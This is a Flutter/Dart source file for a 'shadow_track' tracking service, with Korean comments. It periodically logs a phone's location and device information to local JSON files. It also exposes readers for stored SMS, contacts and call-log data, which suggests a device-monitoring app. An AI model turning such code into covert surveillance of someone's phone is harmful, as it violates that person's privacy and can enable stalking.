import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/services.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';

class TrackingService {
  static const MethodChannel _channel = MethodChannel('shadow_track');

  // 서비스 상태
  static bool _isTracking = false;
  static bool get isTracking => _isTracking;

  // 타이머들
  static Timer? _locationTimer;
  static Timer? _dataCollectionTimer;

  // 수집 간격 (분)
  static const Map<String, int> collectionIntervals = {
    'location': 10,     // 10분마다 위치
    'data': 15,         // 15분마다 시스템 데이터
  };

  /// 서비스 초기화
  static Future<void> initialize() async {
    try {
      // 네이티브 채널 초기화 시도 (오류 무시)
      try {
        await _channel.invokeMethod('initialize');
        print('Native channel initialized successfully');
      } catch (e) {
        print('Native channel initialization failed: $e');
        // 오류 무시하고 계속 진행
      }

      print('TrackingService initialized successfully');
    } catch (e) {
      print('TrackingService initialization error: $e');
    }
  }

  /// 추적 시작
  static Future<void> startTracking() async {
    if (_isTracking) return;

    try {
      // 기본 권한 확인
      final hasPermissions = await _checkBasicPermissions();
      if (!hasPermissions) {
        print('필수 권한이 없어 추적을 시작할 수 없습니다');
        return;
      }

      _isTracking = true;

      // 기본 데이터 수집 시작
      _startLocationTracking();
      _startDataCollection();

      await _logEvent('TRACKING_STARTED', 'Basic monitoring services activated');
      print('Tracking services started successfully');
    } catch (e) {
      print('Error starting tracking: $e');
      _isTracking = false;
      rethrow;
    }
  }

  /// 추적 중지
  static Future<void> stopTracking() async {
    if (!_isTracking) return;

    _isTracking = false;

    // 모든 타이머 중지
    _locationTimer?.cancel();
    _locationTimer = null;
    _dataCollectionTimer?.cancel();
    _dataCollectionTimer = null;

    await _logEvent('TRACKING_STOPPED', 'All monitoring services deactivated');
    print('All tracking services stopped');
  }

  /// 기본 권한 확인
  static Future<bool> _checkBasicPermissions() async {
    try {
      final permissions = [
        Permission.location,
        Permission.storage,
      ];

      Map<Permission, PermissionStatus> statuses = {};
      for (final permission in permissions) {
        statuses[permission] = await permission.status;
      }

      return statuses.values.any((status) => status == PermissionStatus.granted);
    } catch (e) {
      print('Permission check error: $e');
      return false;
    }
  }

  /// 위치 추적 시작
  static void _startLocationTracking() {
    _locationTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['location']!),
            (timer) async {
          try {
            await _collectLocationData();
          } catch (e) {
            print('Location collection error: $e');
          }
        }
    );

    // 즉시 한 번 실행
    _collectLocationData();
  }

  /// 위치 데이터 수집
  static Future<void> _collectLocationData() async {
    try {
      final permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied ||
          permission == LocationPermission.deniedForever) {
        print('Location permission not granted');
        return;
      }

      // 위치 서비스가 활성화되어 있는지 확인
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        print('Location services are disabled');
        return;
      }

      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.medium,
        timeLimit: const Duration(seconds: 30),
      );

      final locationData = {
        'latitude': position.latitude,
        'longitude': position.longitude,
        'accuracy': position.accuracy,
        'altitude': position.altitude,
        'speed': position.speed,
        'heading': position.heading,
        'timestamp': DateTime.now().toIso8601String(),
        'formatted_time': DateTime.now().toString(),
      };

      await _saveDataToFile('location_data.json', locationData);
      print('Location data collected: ${position.latitude}, ${position.longitude}');
    } catch (e) {
      await _logEvent('LOCATION_ERROR', 'Failed to get location: $e');
      print('Location collection error: $e');
    }
  }

  /// 데이터 수집 시작
  static void _startDataCollection() {
    _dataCollectionTimer = Timer.periodic(
        Duration(minutes: collectionIntervals['data']!),
            (timer) async {
          try {
            await _collectSystemData();
          } catch (e) {
            print('Data collection error: $e');
          }
        }
    );

    // 즉시 한 번 실행
    _collectSystemData();
  }

  /// 시스템 데이터 수집
  static Future<void> _collectSystemData() async {
    try {
      // 네이티브 채널을 통한 디바이스 정보 수집 시도
      try {
        final deviceInfo = await _channel.invokeMethod('getDeviceInfo');
        if (deviceInfo != null) {
          await _saveDataToFile('device_info.json', Map<String, dynamic>.from(deviceInfo));
        }
      } catch (e) {
        print('Native device info collection failed: $e');
        // 대체 방법으로 기본 시스템 정보 수집
        await _collectBasicSystemInfo();
      }

      print('System data collection completed');
    } catch (e) {
      await _logEvent('DATA_COLLECTION_ERROR', 'System data collection failed: $e');
      print('System data collection error: $e');
    }
  }

  /// 기본 시스템 정보 수집
  static Future<void> _collectBasicSystemInfo() async {
    try {
      final systemData = {
        'platform': Platform.operatingSystem,
        'platform_version': Platform.operatingSystemVersion,
        'timestamp': DateTime.now().toIso8601String(),
      };

      await _saveDataToFile('system_info.json', systemData);
    } catch (e) {
      print('Basic system info collection failed: $e');
    }
  }

  /// 파일에 데이터 저장
  static Future<void> _saveDataToFile(String fileName, Map<String, dynamic> data) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');
      if (!await logsDir.exists()) {
        await logsDir.create(recursive: true);
      }

      final file = File('${logsDir.path}/$fileName');
      final jsonString = jsonEncode(data);
      await file.writeAsString('$jsonString\n', mode: FileMode.append);
    } catch (e) {
      print('File save error: $e');
    }
  }

  /// 이벤트 로깅
  static Future<void> _logEvent(String event, String details) async {
    final eventData = {
      'event': event,
      'details': details,
      'timestamp': DateTime.now().toIso8601String(),
      'service': 'TrackingService',
    };

    await _saveDataToFile('service_events.json', eventData);
  }

  /// 수집된 데이터 반환 (UI용)
  static Future<List<Map<String, dynamic>>> getCollectedData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (!await logsDir.exists()) {
        return [];
      }

      final allData = <Map<String, dynamic>>[];
      final files = await logsDir.list().toList();

      for (final file in files) {
        if (file is File && file.path.endsWith('.json')) {
          try {
            final content = await file.readAsString();
            final lines = content.split('\n').where((line) => line.trim().isNotEmpty);

            for (final line in lines) {
              try {
                final data = jsonDecode(line) as Map<String, dynamic>;
                data['source_file'] = file.path.split('/').last;
                allData.add(data);
              } catch (e) {
                // JSON 파싱 오류 무시
              }
            }
          } catch (e) {
            // 파일 읽기 오류 무시
          }
        }
      }

      // 최신 순으로 정렬
      allData.sort((a, b) {
        final aTime = a['timestamp'] as String? ?? '';
        final bTime = b['timestamp'] as String? ?? '';
        return bTime.compareTo(aTime);
      });

      return allData;
    } catch (e) {
      print('Data retrieval error: $e');
      return [];
    }
  }

  /// 특정 타입 데이터 반환
  static Future<List<Map<String, dynamic>>> getLocationData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'location_data.json' ||
        data.containsKey('latitude')
    ).toList();
  }

  static Future<List<Map<String, dynamic>>> getSMSData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'sms_data.json' ||
        data.containsKey('address') ||
        data.containsKey('body')
    ).toList();
  }

  static Future<List<Map<String, dynamic>>> getContactsData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'contacts_data.json' ||
        data.containsKey('contactName') ||
        data.containsKey('name')
    ).toList();
  }

  static Future<List<Map<String, dynamic>>> getCallLogData() async {
    final allData = await getCollectedData();
    return allData.where((data) =>
    data['source_file'] == 'call_log.json' ||
        data.containsKey('callType') ||
        data.containsKey('duration')
    ).toList();
  }

  /// 통계 정보
  static Future<Map<String, dynamic>> getCollectionStats() async {
    try {
      final locationData = await getLocationData();
      final smsData = await getSMSData();
      final contactsData = await getContactsData();
      final callLogData = await getCallLogData();

      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      final stats = {
        'location_count': locationData.length,
        'sms_count': smsData.length,
        'contacts_count': contactsData.length,
        'call_log_count': callLogData.length,
        'total_log_files': 0,
        'total_data_files': 0,
        'last_update': DateTime.now().toIso8601String(),
        'event_count': 0,
      };

      if (await logsDir.exists()) {
        final files = await logsDir.list().toList();
        stats['total_log_files'] = files.length;
        stats['total_data_files'] = files.where((f) => f.path.endsWith('.json')).length;

        // 이벤트 카운트
        final eventFile = File('${logsDir.path}/service_events.json');
        if (await eventFile.exists()) {
          final eventContent = await eventFile.readAsString();
          final eventLines = eventContent.split('\n').where((line) => line.trim().isNotEmpty);
          stats['event_count'] = eventLines.length;
        }
      }

      return stats;
    } catch (e) {
      return {'error': 'Failed to get stats: $e'};
    }
  }

  /// 모든 데이터 삭제
  static Future<void> clearAllData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (await logsDir.exists()) {
        await logsDir.delete(recursive: true);
      }

      await _logEvent('DATA_CLEARED', 'All monitoring data cleared');
    } catch (e) {
      print('Clear data error: $e');
    }
  }

  /// 서비스 상태 정보
  static Map<String, dynamic> getServiceStatus() {
    return {
      'is_tracking': _isTracking,
      'location_timer_active': _locationTimer?.isActive ?? false,
      'data_timer_active': _dataCollectionTimer?.isActive ?? false,
      'collection_intervals': collectionIntervals,
      'last_status_check': DateTime.now().toIso8601String(),
    };
  }

  /// 강제 데이터 수집
  static Future<void> forceDataCollection() async {
    if (!_isTracking) {
      throw Exception('Tracking service is not active');
    }

    try {
      await _collectLocationData();
      await _collectSystemData();
      await _logEvent('FORCE_COLLECTION', 'Manual data collection triggered');
    } catch (e) {
      await _logEvent('FORCE_COLLECTION_ERROR', 'Manual collection failed: $e');
      rethrow;
    }
  }
}